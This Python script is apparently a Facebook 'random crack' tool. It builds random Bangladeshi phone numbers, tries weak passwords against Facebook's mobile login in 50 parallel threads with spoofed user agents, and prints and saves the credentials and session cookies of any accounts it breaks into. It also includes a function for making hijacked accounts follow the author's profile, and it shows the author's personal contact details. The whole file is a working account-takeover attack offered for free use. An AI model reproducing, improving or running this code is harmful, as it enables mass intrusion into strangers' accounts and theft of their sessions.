#-------------------------------------------------------------
#Don't Forget To Follow My Github &
#Sent Star This Repositories 🙂
#-------------------------------------------------------------
#10K-Gift-Test-Coding
#!/usr/bin/python3
#-*-coding:utf-8-*-
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
ugen2=[]
ugen=[]
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
         
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
#-----[Logo]-----#
logo = (f"""
\033[38;5;46m ███    ██  █████  ███████ ███    ███ ██    ██ ██      
\033[38;5;46m ████   ██ ██   ██    ███  ████  ████ ██    ██ ██      
\033[38;5;46m ██ ██  ██ ███████   ███   ██ ████ ██ ██    ██ ██      
\033[38;5;46m ██  ██ ██ ██   ██  ███    ██  ██  ██ ██    ██ ██      
\033[38;5;46m ██   ████ ██   ██ ███████ ██      ██  ██████  ███████ 
                                                           
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[38;5;46m       [ WORKING DATA AND WIFI 5G]         \033[38;5;46m  ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[38;5;46m ┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐
\033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mAUTHOR     \033[38;5;46m:  \033[1;97mMR.NAZMUL         \033[38;5;46m│
\033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mFACEBOOK   \033[38;5;46m:  \033[1;97mMD NAZMUL HOSSAN  \033[38;5;46m│
\033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mWHATSAPP   \033[38;5;46m:  \033[1;97m+8801409838328    \033[38;5;46m│
\033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mGITHUB     \033[38;5;46m:  \033[1;97mNAZMUL-KING_01    \033[38;5;46m│
\033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mSTATUS     \033[38;5;46m:  \033[1;97mFREE              \033[38;5;46m│
\033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mWARKS      \033[38;5;46m:  \033[1;97mDATA & WIFI       \033[38;5;46m│
\033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mVARSON     \033[38;5;46m:  \033[1;97m1.0.0             \033[38;5;46m│
\033[38;5;46m └━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n""") 
try:
   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
   v = 5.2
   update = ('5.2')
   update = ('5.2')
   if str(v) in update:
       os.system('clear')
   else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')

def linex():
        print('\033[1;37m ──────────────────────────────────────────')
 
def clear():
    os.system('clear')
    print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def mumit_menu():
    os.system('clear');print(logo)
    print('\033[38;5;46m [1] RANDOM CRACK')
    print('\033[31;1m [0] EXIT TOOL')
    linex()
    mumit=input('\033[1;33m [?] SELECT MENU: ')
    if mumit in['1','01']:NAZMUL()
    elif mumit in['0','00']:exit()
    else:exit()
    
def NAZMUL():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[38;5;46m [√] BD CODE : 017/019/016/018/013')
    linex()
    code = input('\033[33;1m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[38;5;46m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[33;1m [?] CHOOSE : '))
    linex()
    xd_cp=input(f'\033[38;5;46m [?] You Want To Show Cp Account? [\033[38;5;46mY\033[1;33m/\033[1;31mN\033[31;1m]: ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ahare:
        clear()
        tl = str(len(user))
        print('\033[38;5;46m [✓] Use Flight Mode For Speed Up')
        print('\033[38;5;46m [✓] ADMIN : MD NAZMUL HOSSAN ')
        print('\033[38;5;46m [✓] NUMBER: 01409838328')
        print('\033[38;5;46m [✓] Choice Code: '+code)
        linex()
        for fuck in user:
            pwx = [fuck,'bangladesh']
            uid = code+fuck
            ahare.submit(mumitx,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /NAZMUL-OK🔥.txt')
    print('Cp Ids Saved in /NAZMUL-CP🤭.txt')
    linex()
    
def mumitx(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
    'method':'POST',
    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    'scheme':'https',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVoPmsopEAk',
    'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[38;5;46m[NAZMUL-OK🔥] ' +uid+ ' | ' +ps+ ' \033[38;5;46m')
                print('\033[38;5;46m[COOKIE] = \033[38;5;46m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/NAZMUL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[38;5;46m[NAZMUL-CP🤭]  ' +uid+ ' | ' +ps+ ' \033[31;1m')
                open('/sdcard/NAZMUL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[38;5;46m[\033[38;5;46mNAZMUL\033[38;5;46m]..[\033[38;5;46m%s/%s\033[38;5;46m]..[\033[38;5;46mOK\033[0;97m/\033[38;5;46mCP\033[38;5;46m]..[\033[38;5;46m%s\033[38;5;46m/\033[38;5;46m%s\033[38;5;46m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

#-----[Run Menu]-----#
mumit_menu()
